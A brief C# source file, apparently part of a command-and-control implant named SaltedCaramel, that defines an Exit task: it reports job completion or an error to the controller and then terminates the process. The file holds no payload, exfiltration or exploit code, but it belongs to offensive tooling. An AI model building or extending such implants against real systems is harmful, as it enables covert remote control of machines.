using System;
using SaltedCaramel.Jobs;

namespace SaltedCaramel.Tasks
{
    public class Exit
    {
        /// <summary>
        /// Exit the process.
        /// </summary>
        /// <param name="job">Job associated with the task.</param>
        /// <param name="implant">Agent to run this on.</param>
        public static void Execute(Job job, SCImplant implant)
        {
            SCTask task = job.Task;
            try
            {
                implant.TrySendComplete(job);
            }
            catch (Exception e)
            {
                implant.Profile.SendError(task.id, e.Message);
            }
            Environment.Exit(0);
        }
    }
}
